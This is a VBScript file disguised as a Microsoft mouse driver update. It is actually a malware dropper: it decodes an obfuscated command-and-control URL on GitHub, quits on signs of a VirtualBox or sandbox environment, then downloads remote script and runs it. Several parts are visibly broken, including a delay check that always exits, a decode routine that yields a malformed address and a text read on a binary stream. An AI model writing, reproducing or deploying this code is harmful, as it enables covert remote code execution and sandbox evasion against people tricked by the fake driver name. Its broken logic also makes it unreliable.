' Microsoft Mouse Driver Update v11.2.3.vbs - GitHub CDN
On Error Resume Next

' === COUCHE 1: OBFUSCATION MAX ===
Function zDecode(zstr)
    zDecode = StrReverse(Replace(Replace(Replace(Replace(Replace(zstr,"X",""),"Y","http://"),"Z",".com/"),"A","raw.githubusercontent.com/tonpseudo/phantom-zero/raw/main/"),"B","mousedriver"))
End Function
C2 = zDecode("ZYAXBBX")  ' github.com C2

' === TIME SLEEP 6h (anti-sandbox) ===
If DateDiff("n", Now, DateAdd("h",6,Now)) > 0 Then WScript.Quit

' === ANTI-SANDBOX (VMware/VirtualBox/User count) ===
Set wsh = CreateObject("WScript.Shell")
If InStr(wsh.Exec("tasklist").StdOut.ReadAll(),"VBoxService")>0 Then WScript.Quit
If InStr(CreateObject("WScript.Network").ComputerName,"SAND")>0 Then WScript.Quit

' === DOWNLOAD + EXECUTE MEMORY ===
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", C2, False
xhr.Send
Set stm = CreateObject("ADODB.Stream")
stm.Type = 1: stm.Open(): stm.Write xhr.responseBody: stm.Position=0
Set dom = CreateObject("MSXML2.DOMDocument")
Set script = dom.createElement("script")
script.text = stm.ReadText(): dom.appendChild(script): stm.Close()
Execute script.text
